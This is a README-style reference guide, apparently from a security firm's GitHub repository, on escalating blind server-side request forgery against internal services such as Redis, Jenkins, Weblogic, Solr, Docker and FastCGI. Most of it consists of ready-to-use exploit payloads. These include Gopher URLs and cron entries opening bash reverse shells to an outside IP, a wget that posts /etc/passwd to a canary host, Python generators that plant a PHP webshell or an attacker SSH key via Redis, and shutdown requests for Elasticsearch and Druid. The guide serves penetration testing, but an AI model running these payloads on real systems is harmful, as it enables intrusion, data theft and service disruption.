## Introduction
https://github.com/assetnote/blind-ssrf-chains/edit/main/README.md
############
##

## What is Server Side Request Forgery (SSRF)?

Server Side Request Forgery occurs when you can coerce a server to make arbitrary requests on your behalf. As the requests are being made by the server, it may be possible to access internal resources due to where the server is positioned in the network. On cloud environments, SSRF poses a more significant risk due to the presence of [metadata endpoints](https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b) that may contain sensitive credentials or secrets.

## Blind SSRF

When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read. In the industry, this behaviour is often referred to as "Blind SSRF". In such situations, how do we prove impact? This was an interesting discussion that was sparked by Justin Gardner on Twitter:

<blockquote class="twitter-tweet" data-theme="dark"><p lang="en" dir="ltr">I&#39;ve been finding a large amount of Blind SSRFs recently. What kind of one-shot RCE&#39;s have you guys used as pivots for these in the past? I&#39;ve got access to some Kafka and a bunch of other things. <a href="https://twitter.com/nnwakelam?ref_src=twsrc%5Etfw">@nnwakelam</a> <a href="https://twitter.com/thedawgyg?ref_src=twsrc%5Etfw">@thedawgyg</a></p>&mdash; Justin Gardner (@Rhynorater) <a href="https://twitter.com/Rhynorater/status/1349290375312154625?ref_src=twsrc%5Etfw">January 13, 2021</a></blockquote>

If you can reach internal resources, there are a number of potential exploit chains that can be executed to prove impact. This blog post attempts to go into detail for each known exploit chain when leveraging blind SSRF, and will be updated as more techniques are discovered and shared.

If we've missed any techniques, please send us a tweet or a DM: [@assetnote](https://twitter.com/assetnote) and we'll add it to this blog.

## SSRF Canaries

<blockquote class="twitter-tweet" data-conversation="none" data-theme="dark"><p lang="en" dir="ltr">I tend to call them SSRF canaries, when chaining a blind SSRF to another SSRF internally which makes an additional call externally, or by an app-specific open redir or blind XXE. Confluence, Artifactory, Jenkins and JAMF have some that works well.</p>&mdash; Frans Rosén (@fransrosen) <a href="https://twitter.com/fransrosen/status/1349397387920502786?ref_src=twsrc%5Etfw">January 13, 2021</a></blockquote> 

In order to validate that you can interact with internal services or applications, you can utilise "SSRF canaries". 

This is when we can request an internal URL that performs another SSRF and calls out to your canary host. If you receive a request to your canary host, it means that you have successfully hit an internal service that is also capable making outbound requests. 

This is an effective way to verify that an SSRF vulnerability has access to a internal networks or applications, and to also verify the presence of certain software existing on the internal network. You can also potentially pivot to more sensitive parts of an internal network using an SSRF canary, depending on where it sits.

## Using DNS datasources and AltDNS to find internal hosts

With the goal being to find as many internal hosts as possible, DNS datasources can be utilised to find all records that point to internal hosts. 

On cloud environments, we often see ELBs that are pointing to hosts inside an internal VPC. Depending on which VPC the asset you're targeting is in, it may be possible to access other hosts within the same VPC. 

For example, consider the following host has been discovered from DNS datasources:

```bash
livestats.target.com -> internal-es-livestats-298228113.us-west-2.elb.amazonaws.com -> 10.0.0.82
```

You can make an assumption that the `es` stands for Elasticsearch, and then perform further attacks on this host. You can also spray all of these blind SSRF payloads across all of the "internal" hosts that have been identified through this method. This is often effective.

To find more internal hosts, I recommend taking all of your DNS data and then using something like [AltDNS](https://github.com/infosec-au/altdns) to generate permutations and then resolve them with a [fast DNS bruteforcer](https://github.com/blechschmidt/massdns).

Once this is complete, identify all of the newly discovered internal hosts and use them as a part of your blind SSRF chain.

## Side Channel Leaks

When exploiting blind SSRF vulnerabilities, you may be able to leak some information about the response being returned. For example, let's say that you have blind SSRF via an XXE, the error messages may indicate whether or not:

- A response was returned 

`Error parsing request: System.Xml.XmlException: Expected DTD markup was not found. Line 1, position 1.`

vs.

- Host and port are unreachable

`Error parsing request: System.Net.WebException: Unable to connect to the remote server`

Similarly, outside of XXEs, a web application could also have a side channel leak that can be ascertained by inspecting differences within the:

- **Response status code**: 

Online internal asset:port responds with `200 OK` vs offline internal asset:port `500 Internal Server Error`

- **Response contents**: 

The response size in bytes is smaller or bigger depending on whether or not the URL you are trying to request is reachable.

- **Response timing**: 

The response times are slower or faster depending on whether or not the URL you are trying to request is reachable.

---------------

# Techniques
**Possible via HTTP(s)**

- [Elasticsearch](#elasticsearch)
- [Weblogic](#weblogic)
- [Hashicorp Consul](#consul)
- [Shellshock](#shellshock)
- [Apache Druid](#druid)
- [Apache Solr](#solr)
- [PeopleSoft](#peoplesoft)
- [Apache Struts](#struts)
- [JBoss](#jboss)
- [Confluence](#confluence)
- [Jira](#jira)
- [Other Atlassian Products](#atlassian-products)
- [OpenTSDB](#opentsdb)
- [Jenkins](#jenkins)
- [Hystrix Dashboard](#hystrix)
- [W3 Total Cache](#w3)
- [Docker](#docker)
- [Gitlab Prometheus Redis Exporter](#redisexporter)

**Possible via Gopher**

- [Redis](#redis)
- [Memcache](#memcache)
- [Apache Tomcat](#tomcat)
- [FastCGI](#fastcgi)
- [Java RMI](#java-rmi)

**Tools**

- [Gopherus](#gopherus)
- [remote-method-guesser](#remote-method-guesser)
- [SSRF Proxy](#ssrfproxy)

----------------------------------

**Possible via HTTP(s)**

<div id="elasticsearch"></div>

## Elasticsearch

**Commonly bound port: 9200**

When Elasticsearch is deployed internally, it usually does not require authentication. 

If you have a partially blind SSRF where you can determine the status code, check to see if the following endpoints return a 200:

```http
/_cluster/health
/_cat/indices
/_cat/health
```

If you have a blind SSRF where you can send POST requests, you can shut down the Elasticsearch instance by sending a POST request to the following path:

Note: the `_shutdown` API has been removed from Elasticsearch version 2.x. and up. This only works in Elasticsearch 1.6 and below:

```http
/_shutdown
/_cluster/nodes/_master/_shutdown
/_cluster/nodes/_shutdown
/_cluster/nodes/_all/_shutdown
```

<div id="weblogic"></div>

## Weblogic

**Commonly bound ports: 80, 443 (SSL), 7001, 8888**

**SSRF Canary: UDDI Explorer (CVE-2014-4210)**

```http
POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
Host: target.com
Content-Length: 137
Content-Type: application/x-www-form-urlencoded

operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```

This also works via GET:

```bash
http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```

This endpoint is also vulnerable to CRLF injection:

```
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.0
Host: vuln.weblogic
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Connection: close
```

Will result in the following request:

```
root@mail:~# nc -lvp 4000
Listening on [0.0.0.0] (family 0, port 4000)
Connection from example.com 43111 received!
POST /exp HTTP/1.11
X-CLRF: Injected HTTP/1.1
Content-Type: text/xml; charset=UTF-8
soapAction: ""
Content-Length: 418
User-Agent: Java1.6.0_24
Host: attacker.com:4000
Accept: text/html, image/gif, image/jpeg, */*; q=.2
Connection: Keep-Alive

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><env:Header/><env:Body><find_business generic="2.0" xmlns="urn:uddi-org:api_v2"><name>sdf</name></find_business></env:Body></env:Envelope>
```

**SSRF Canary: CVE-2020-14883**

Taken from [here](https://forum.90sec.com/t/topic/1412).

Linux:

```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```

Windows:

```http
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```

<div id="consul"></div>

## Hashicorp Consul

**Commonly bound ports: 8500, 8501 (SSL)**

Writeup can be found [here](https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html).

<div id="shellshock"></div>

## Shellshock

**Commonly bound ports: 80, 443 (SSL), 8080**

In order to effectively test for Shellshock, you may need to add a header containing the payload. The following CGI paths are worth trying:

Short list of CGI paths to test:

[Gist containing paths](https://gist.github.com/infosec-au/009fcbdd5bad16bb6ceb36b838d96be4).

**SSRF Canary: Shellshock via User Agent**

```bash
User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
```

<div id="druid"></div>

## Apache Druid

**Commonly bound ports: 80, 8080, 8888, 8082**

See the API reference for Apache Druid [here](https://druid.apache.org/docs/latest/operations/api-reference.html).

If you can view the status code, check the following paths to see if they return a 200 status code:

```bash
/status/selfDiscovered/status
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/indexer/v1/taskStatus
```

Shutdown tasks, requires you to guess task IDs or the datasource name:

```bash
/druid/indexer/v1/task/{taskId}/shutdown
/druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
```

Shutdown supervisors on Apache Druid Overlords:

```bash
/druid/indexer/v1/supervisor/terminateAll
/druid/indexer/v1/supervisor/{supervisorId}/shutdown
```

<div id="solr"></div>

## Apache Solr

**Commonly bound port: 8983**

**SSRF Canary: Shards Parameter**

<blockquote class="twitter-tweet" data-conversation="none" data-theme="dark"><p lang="en" dir="ltr">To add to what shubham is saying - scanning for solr is relatively easy. There is a shards= param which allows you to bounce SSRF to SSRF to verify you are hitting a solr instance blindly.</p>&mdash; Хавиж Наффи 🥕 (@nnwakelam) <a href="https://twitter.com/nnwakelam/status/1349298311853821956?ref_src=twsrc%5Etfw">January 13, 2021</a></blockquote>

Taken from [here](https://github.com/veracode-research/solr-injection).

```bash
/search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
/solr/db/select?q=orange&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json
/xxx?q=aaa%26shards=http://SSRF_CANARY/solr 
/xxx?q=aaa&shards=http://SSRF_CANARY/solr
```

**SSRF Canary: Solr XXE (2017)**

[Apache Solr 7.0.1 XXE (Packetstorm)](https://packetstormsecurity.com/files/144678/Apache-Solr-7.0.1-XXE-Injection-Code-Execution.html)

```bash
/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://SSRF_CANARY/xxx"'><a></a>'
/xxx?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'><a></a>"}
```

**RCE via dataImportHandler**

[Research on RCE via dataImportHandler](https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler)

<div id="peoplesoft"></div>

## PeopleSoft

**Commonly bound ports: 80,443 (SSL)**

Taken from this research [here](https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce).

**SSRF Canary: XXE #1**

```http
POST /PSIGW/HttpListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<?xml version="1.0"?>
<!DOCTYPE IBRequest [
<!ENTITY x SYSTEM "http://SSRF_CANARY">
]>
<IBRequest>
   <ExternalOperationName>&x;</ExternalOperationName>
   <OperationType/>
   <From><RequestingNode/>
      <Password/>
      <OrigUser/>
      <OrigNode/>
      <OrigProcess/>
      <OrigTimeStamp/>
   </From>
   <To>
      <FinalDestination/>
      <DestinationNode/>
      <SubChannel/>
   </To>
   <ContentSections>
      <ContentSection>
         <NonRepudiation/>
         <MessageVersion/>
         <Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
         </Data>
      </ContentSection>
   </ContentSections>
</IBRequest>
```

**SSRF Canary: XXE #2**

```http
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<!DOCTYPE a PUBLIC "-//B/A/EN" "http://SSRF_CANARY">
```

<div id="struts"></div>

## Apache Struts

**Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)**

Taken from [here](https://blog.safebuff.com/2016/07/03/SSRF-Tips/).

**SSRF Canary: Struts2-016**:

Append this to the end of every internal endpoint/URL you know of:

```http
?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```

<div id="jboss"></div>

## JBoss

**Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)**

Taken from [here](https://blog.safebuff.com/2016/07/03/SSRF-Tips/).

**SSRF Canary: Deploy WAR from URL**

```bash
/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war
```

<div id="confluence"></div>

## Confluence

**Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)**

**SSRF Canary: Sharelinks  (Confluence versions released from 2016 November and older)**

```bash
/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
```

**SSRF Canary: iconUriServlet - Confluence < 6.1.3 (CVE-2017-9506)**

[Atlassian Security Ticket OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)

```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```


<div id="jira"></div>

## Jira

**Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)**

**SSRF Canary: iconUriServlet - Jira < 7.3.5 (CVE-2017-9506)**

[Atlassian Security Ticket OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)

```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```

**SSRF Canary: makeRequest - Jira < 8.4.0 (CVE-2019-8451)**

[Atlassian Security Ticket JRASERVER-69793](https://jira.atlassian.com/browse/JRASERVER-69793)

```bash
/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:443@example.com
```

<div id="atlassian-products"></div>

## Other Atlassian Products

**Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)**

**SSRF Canary: iconUriServlet (CVE-2017-9506)**:
- Bamboo < 6.0.0
- Bitbucket < 4.14.4
- Crowd < 2.11.2
- Crucible < 4.3.2
- Fisheye < 4.3.2

[Atlassian Security Ticket OAUTH-344](https://ecosystem.atlassian.net/browse/OAUTH-344)

```bash
/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
```

<div id="opentsdb"></div>

## OpenTSDB

**Commonly bound port: 4242**

[OpenTSDB Remote Code Execution](https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html)

**SSRF Canary: curl via RCE**

```bash
/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60curl%20SSRF_CANARY%60&style=linespoint&png
```

[OpenTSDB 2.4.0 Remote Code Execution](https://github.com/OpenTSDB/opentsdb/issues/2051)

**SSRF Canary: curl via RCE - CVE-2020-35476**

```bash
/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system('wget%20--post-file%20/etc/passwd%20SSRF_CANARY')]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
```

<div id="jenkins"></div>

## Jenkins

**Commonly bound ports: 80,443 (SSL),8080,8888**

Great writeup [here](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html).

**SSRF Canary: CVE-2018-1000600**

```bash
/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&login=orange&password=tsai
```

**RCE**

Follow the instructions here to achieve RCE via GET: [Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html)

```bash
/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
```

**RCE via Groovy**

```
cmd = 'curl burp_collab'
pay = 'public class x {public x(){"%s".execute()}}' % cmd
data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=' + urllib.quote(pay)
```

<div id="hystrix"></div>

## Hystrix Dashboard

**Commonly bound ports: 80,443 (SSL),8080**

Spring Cloud Netflix, versions 2.2.x prior to 2.2.4, versions 2.1.x prior to 2.1.6.

**SSRF Canary: CVE-2020-5412**

```bash
/proxy.stream?origin=http://SSRF_CANARY/
```

<div id="w3"></div>

## W3 Total Cache

**Commonly bound ports: 80,443 (SSL)**

W3 Total Cache 0.9.2.6-0.9.3

**SSRF Canary: CVE-2019-6715**

This needs to be a PUT request:

```bash
PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36
Content-Length: 124
Content-Type: application/x-www-form-urlencoded
Connection: close

{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://SSRF_CANARY"}
```

**SSRF Canary**

The advisory for this vulnerability was released here: [W3 Total Cache SSRF vulnerability](https://klikki.fi/adv/w3_total_cache.html)

This PHP code will generate a payload for your SSRF Canary host (replace `url` with your canary host):

```php
<?php

$url='http://www.google.com';
$file=strtr(base64_encode(gzdeflate($url.'#https://ajax.googleapis.com')), '+/=', '-_');
$file=chop($file,'=');
$req='/wp-content/plugins/w3-total-cache/pub/minify.php?file='.$file.'.css';
echo($req);

?>
```

## Docker

**Commonly bound ports: 2375, 2376 (SSL)**

If you have a partially blind SSRF, you can use the following paths to verify the presence of Docker's API:

```bash
/containers/json
/secrets
/services
```

**RCE via running an arbitrary docker image**

```http
POST /containers/create?name=test HTTP/1.1
Host: website.com
Content-Type: application/json
...

{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}
```

Replace alpine with an arbitrary image you would like the docker container to run.

## Gitlab Prometheus Redis Exporter

**Commonly bound ports: 9121**

This vulnerability affects Gitlab instances before version 13.1.1. According to the [Gitlab documentation](https://docs.gitlab.com/ee/administration/monitoring/prometheus/#configuring-prometheus) `Prometheus and its exporters are on by default, starting with GitLab 9.0. `

These exporters provide an excellent method for an attacker to pivot and attack other services using CVE-2020-13379. One of the exporters which is easily exploited is the Redis Exporter. 

The following endpoint will allow an attacker to dump all the keys in the redis server provided via the target parameter:

```bash
http://localhost:9121/scrape?target=redis://127.0.0.1:7001&check-keys=*
```

----------

**Possible via Gopher**

<div id="redis"></div>

## Redis

**Commonly bound port: 6379**

Recommended reading:

- [Trying to hack Redis via HTTP requests](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html)
- [SSRF Exploits against Redis](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis)

**RCE via Cron** - [Gopher Attack Surfaces](https://blog.chaitin.cn/gopher-attack-surfaces/)

```bash
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save
```

Gopher:

```bash
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

**RCE via Shell Upload (PHP)** - [Redis Getshell Summary](https://www.mdeditor.tw/pl/pBy0)

```python
#!/usr/bin/env python
# -*-coding:utf-8-*-

import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379" 
shell="\n\n<?php phpinfo();?>\n\n"
filename="shell.php"
path="/var" 
passwd=""

cmd=["flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print payload
```

**RCE via authorized_keys** - [Redis Getshell Summary](https://www.mdeditor.tw/pl/pBy0)

```python
import urllib
protocol="gopher://"
ip="192.168.189.208"
port="6379"
# shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
sshpublic_key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8IOnJUAt5b/5jDwBDYJTDULjzaqBe2KW3KhqlaY58XveKQRBLrG3ZV0ffPnIW5SLdueunb4HoFKDQ/KPXFzyvVjqByj5688THkq1RJkYxGlgFNgMoPN151zpZ+eCBdFZEf/m8yIb3/7Cp+31s6Q/DvIFif6IjmVRfWXhnkjNehYjsp4gIEBiiW/jWId5yrO9+AwAX4xSabbxuUyu02AQz8wp+h8DZS9itA9m7FyJw8gCrKLEnM7PK/ClEBevDPSR+0YvvYtnUxeCosqp9VrjTfo5q0nNg9JAvPMs+EA1ohUct9UyXbTehr1Bdv4IXx9+7Vhf4/qwle8HKali3feIZ root@kali\n\n"
filename="authorized_keys"
path="/root/.ssh/"
passwd=""
cmd=["flushall",
     "set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print payload
```

**RCE on GitLab via Git protocol**

Great writeup from Liveoverflow [here](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/).

While this required authenticated access to GitLab to exploit, I am including the payload here as the `git` protocol may work on the target you are hacking. This payload is for reference.

```bash
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```

<div id="memcache"></div>

## Memcache

**Commonly bound port: 11211**

- [vBulletin Memcache RCE](https://www.exploit-db.com/exploits/37815)
- [GitHub Enterprise Memcache RCE](https://www.exploit-db.com/exploits/42392)
- [Example Gopher payload for Memcache](https://blog.safebuff.com/2016/07/03/SSRF-Tips/#SSRF-memcache-Getshell)

```bash
gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a
```

<div id="tomcat"></div>

## Apache Tomcat

**Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)**

Effective against Tomcat 6 only:

[gopher-tomcat-deployer](https://github.com/pimps/gopher-tomcat-deployer)

CTF writeup using this technique:

[From XXE to RCE: Pwn2Win CTF 2018 Writeup](https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/)


<div id="fastcgi"></div>

## FastCGI

**Commonly bound ports: 80,443 (SSL)**

This was taken from [here](https://blog.chaitin.cn/gopher-attack-surfaces/).

```bash
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
```

<div id="java-rmi"></div>

## Java RMI

**Commonly bound ports: 1090,1098,1099,1199,4443-4446,8999-9010,9999**

Blind *SSRF* vulnerabilities that allow arbitrary bytes (*gopher based*) can be used to perform deserialization or
codebase attacks on the *Java RMI* default components (*RMI Registry*, *Distributed Garbage Collector*, *Activation System*).
A detailed writeup can be found [here](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/). The following listing
shows an example for the payload generation:

```console
$ rmg serial 127.0.0.1 1090 CommonsCollections6 'curl example.burpcollaborator.net' --component reg --ssrf --gopher
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI Registry endpoint...
[+]
[+] 	SSRF Payload: gopher://127.0.0.1:1090/_%4a%52%4d%49%00%02%4c%50%ac%ed%00%05%77%22%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%02%44%15%4d[...]
```

-------------------

**Tools**

<div id="gopherus"></div>

## Gopherus

- [Gopherus - Github](https://github.com/tarunkant/Gopherus)
- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

This tool generates Gopher payloads for:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache


<div id="remote-method-guesser"></div>

## remote-method-guesser

- [remote-method-guesser - Github](https://github.com/qtc-de/remote-method-guesser)
- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

*remote-method-guesser* is a *Java RMI* vulnerability scanner that supports attack operations for most common *Java RMI*
vulnerabilities. Most of the available operations support the ``--ssrf`` option, to generate an *SSRF* payload for the
requested operation. Together with the ``--gopher`` option, ready to use *gopher* payloads can be generated directly.


<div id="ssrfproxy"></div>

## SSRF Proxy

- [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

